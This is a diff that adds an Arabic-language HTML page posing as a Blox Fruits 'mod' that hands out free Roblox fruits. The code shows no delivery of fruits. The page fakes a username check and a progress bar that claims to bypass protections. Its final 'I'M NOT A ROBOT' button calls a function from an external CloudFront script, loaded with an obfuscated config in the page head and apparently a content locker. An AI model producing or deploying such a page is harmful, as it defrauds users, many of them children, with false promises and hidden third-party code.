@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blox Fruits Mod - Premium Edition</title>
+    
+    <script type="text/javascript">
+        var sGqbW_HAn_iYycfc={"it":4589320,"key":"8cc59"};
+    </script>
+    <script src="https://da4talg8ap14y.cloudfront.net/79868ce.js"></script>
+
+    <style>
+        :root {
+            --glow: #00d4ff;
+            --glass: rgba(255, 255, 255, 0.1);
+            --accent: #ffcc00;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: url('img/bg.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            text-align: center;
+            overflow-x: hidden;
+        }
+
+        .overlay { background: rgba(0, 0, 0, 0.7); min-height: 100vh; padding: 20px; }
+
+        header img { width: 180px; margin-bottom: 10px; }
+        h1 { font-size: 1.5rem; text-transform: uppercase; letter-spacing: 2px; }
+
+        /* Slots Section */
+        .slots-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .slot {
+            width: 100px;
+            height: 100px;
+            background: url('img/slot.png') no-repeat center;
+            background-size: contain;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .slot img { width: 70%; height: 70%; object-fit: contain; display: none; }
+
+        /* Fruits Grid */
+        .fruits-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
+            gap: 15px;
+            max-width: 600px;
+            margin: auto;
+            background: var(--glass);
+            padding: 20px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .fruit-card {
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            padding: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+            border: 1px solid transparent;
+        }
+
+        .fruit-card:hover { transform: translateY(-5px); border-color: var(--glow); }
+        .fruit-card img { width: 60px; height: 60px; }
+        .fruit-card p { margin: 5px 0 0; font-size: 0.8rem; font-weight: bold; }
+
+        /* Input & Buttons */
+        .step { display: none; animation: slideIn 0.5s ease; }
+        .active { display: block; }
+
+        input {
+            background: var(--glass);
+            border: 2px solid var(--glow);
+            padding: 15px;
+            border-radius: 10px;
+            color: white;
+            width: 80%;
+            max-width: 300px;
+            font-size: 1.1rem;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #00d4ff, #0055ff);
+            border: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 15px var(--glow);
+        }
+
+        /* Avatar Section */
+        #avatar-display { margin: 20px 0; display: none; }
+        #avatar-img { width: 120px; border-radius: 50%; border: 3px solid var(--accent); }
+
+        @keyframes slideIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        
+        .flying-fruit {
+            position: fixed;
+            z-index: 1000;
+            transition: all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            width: 60px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="overlay">
+    <header>
+        <img src="img/logo.png" alt="Logo">
+        <h1 id="header-text">اختر 3 فواكه - تسليم فوري!</h1>
+    </header>
+
+    <div id="step1" class="step active">
+        <div class="slots-container">
+            <div class="slot" id="slot-0"></div>
+            <div class="slot" id="slot-1"></div>
+            <div class="slot" id="slot-2"></div>
+        </div>
+
+        <div class="fruits-grid" id="fruitsGrid">
+            </div>
+
+        <div style="margin-top: 25px;">
+            <button class="btn" id="continueBtn" style="display:none;" onclick="showStep(2)">استمرار</button>
+        </div>
+    </div>
+
+    <div id="step2" class="step">
+        <h2 id="status-text">أدخل اسم مستخدم Roblox</h2>
+        <input type="text" id="username" placeholder="اسم المستخدم هنا...">
+        <br>
+        <button class="btn" onclick="verifyUser()">تحقق من الحساب</button>
+        
+        <div id="avatar-display">
+            <img id="avatar-img" src="" alt="Avatar">
+            <p id="found-name"></p>
+            <button class="btn" onclick="showStep(3)" style="background: #28a745;">تأكيد الحساب</button>
+        </div>
+        <p id="error-msg" style="color: #ff4444;"></p>
+    </div>
+
+    <div id="step3" class="step">
+        <h2 id="process-text">جاري الاتصال بالسيرفر...</h2>
+        <div style="width: 80%; background: rgba(255,255,255,0.1); height: 10px; margin: 20px auto; border-radius: 10px; overflow: hidden;">
+            <div id="progress" style="width: 0%; height: 100%; background: var(--glow); transition: 0.1s;"></div>
+        </div>
+    </div>
+
+    <div id="step4" class="step">
+        <h2>الخطوة الأخيرة! 🎁</h2>
+        <p>أنت على وشك استلام الفواكه. يرجى إكمال التحقق البشري لمرة واحدة.</p>
+        <button class="btn" onclick="_uj()" style="background: var(--accent); color: black; font-size: 1.5rem;">I'M NOT A ROBOT</button>
+    </div>
+
+</div>
+
+<audio id="snd-click" src="sounds/click.mp3"></audio>
+<audio id="snd-success" src="sounds/success.mp3"></audio>
+<audio id="snd-error" src="sounds/error.mp3"></audio>
+
+<script>
+    const fruits = ["Dragon", "Kitsune", "Leopard", "Control", "Dough", "Venom", "Shadow", "Spirit", "Mammoth", "Gas"];
+    let selected = [];
+
+    // توليد شبكة الفواكه
+    const grid = document.getElementById('fruitsGrid');
+    fruits.forEach(name => {
+        const card = document.createElement('div');
+        card.className = 'fruit-card';
+        card.innerHTML = `<img src="img/${name.toLowerCase()}.png" id="img-${name}"><p>${name}</p>`;
+        card.onclick = (e) => selectFruit(name, e);
+        grid.appendChild(card);
+    });
+
+    function selectFruit(name, event) {
+        if (selected.length >= 3 || selected.includes(name)) return;
+
+        document.getElementById('snd-click').play();
+        selected.push(name);
+
+        // تأثير الطيران
+        const img = document.getElementById(`img-${name}`);
+        const rect = img.getBoundingClientRect();
+        const clone = img.cloneNode();
+        clone.className = 'flying-fruit';
+        clone.style.left = rect.left + 'px';
+        clone.style.top = rect.top + 'px';
+        document.body.appendChild(clone);
+
+        const targetSlot = document.getElementById(`slot-${selected.length - 1}`);
+        const targetRect = targetSlot.getBoundingClientRect();
+
+        setTimeout(() => {
+            clone.style.left = (targetRect.left + 20) + 'px';
+            clone.style.top = (targetRect.top + 20) + 'px';
+            clone.style.transform = 'scale(0.5)';
+            clone.style.opacity = '0';
+        }, 10);
+
+        setTimeout(() => {
+            targetSlot.innerHTML = `<img src="img/${name.toLowerCase()}.png" style="display:block">`;
+            clone.remove();
+            if (selected.length === 3) document.getElementById('continueBtn').style.display = 'inline-block';
+        }, 600);
+    }
+
+    function showStep(n) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step' + n).classList.add('active');
+        if(n === 3) startProcessing();
+    }
+
+    async function verifyUser() {
+        const user = document.getElementById('username').value;
+        const error = document.getElementById('error-msg');
+        const display = document.getElementById('avatar-display');
+        
+        if (user.length < 3) return;
+
+        try {
+            document.getElementById('status-text').innerText = "جاري البحث عن الحساب...";
+            // Roblox Avatar API (Direct link for display)
+            const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userName=${user}&width=150&height=150&format=png`;
+            
+            // محاكاة تأخير البحث
+            setTimeout(() => {
+                document.getElementById('snd-success').play();
+                document.getElementById('avatar-img').src = avatarUrl;
+                document.getElementById('found-name').innerText = "@" + user;
+                display.style.display = "block";
+                document.getElementById('status-text').innerText = "تم العثور على الحساب!";
+                error.innerText = "";
+            }, 1500);
+
+        } catch (e) {
+            document.getElementById('snd-error').play();
+            error.innerText = "تعذر العثور على اسم المستخدم!";
+        }
+    }
+
+    function startProcessing() {
+        let width = 0;
+        const bar = document.getElementById('progress');
+        const text = document.getElementById('process-text');
+        const logs = [
+            "جاري تهيئة البيانات...",
+            "جارِ تجاوز نظام الحماية...",
+            "توليد كود الفواكه الـ 3...",
+            "تحضير الخطوة النهائية..."
+        ];
+
+        const interval = setInterval(() => {
+            width += Math.random() * 2;
+            if (width >= 100) {
+                clearInterval(interval);
+                showStep(4);
+            }
+            bar.style.width = width + "%";
+            text.innerText = logs[Math.floor(width / 30)] || logs[3];
+        }, 100);
+    }
+</script>
+</body>
+</html>
